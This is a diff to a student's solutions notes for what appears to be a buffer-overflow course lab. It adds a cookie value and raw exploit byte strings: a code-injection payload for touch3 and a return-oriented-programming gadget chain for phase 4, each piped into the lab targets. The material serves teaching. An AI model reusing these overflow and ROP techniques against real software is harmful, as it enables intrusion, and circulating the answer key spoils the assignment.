@@ -1,5 +1,7 @@
 # Solutions
 
+cookie: 0x59b997fa
+
 ## info
 
 piping into gdb example: ./hex2raw < phase2.txt > rawphase2.txt
@@ -29,3 +31,13 @@ push func address of touch3 onto stack;
 return (this takes you to touch3);
 
 python3 -c 'import sys; sys.stdout.buffer.write( b"\x48\xc7\xc7\xa8\xdc\x61\x55" + b"\x68\xfa\x18\x40\x00" + b"\xc3" + b"\x00"*27 + b"\x78\xdc\x61\x55" + b"\x00"*4 + b"\x35\x39\x62\x39\x39\x37\x66\x61\x00")' | ./ctarget -q
+
+## phase 4
+
+Probable approach: use our interesting code bits in our gadgets to pass cookie to rdi, then hit touch 2... we want to structure our buffer so that it contains addresses of interesting function bits in sequential order.
+
+^ this approach was right!
+
+python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*40 + b"\xcc\x19\x40"+ b"\x00"*5 + b"\xfa\x97\xb9\x59" + b"\x00"*4 + b"\xa2\x19\x40" + b"\x00"*5 + b"\xec\x17\x40"+b"\x00"*5)' | ./rtarget -q
+
+## phase 5
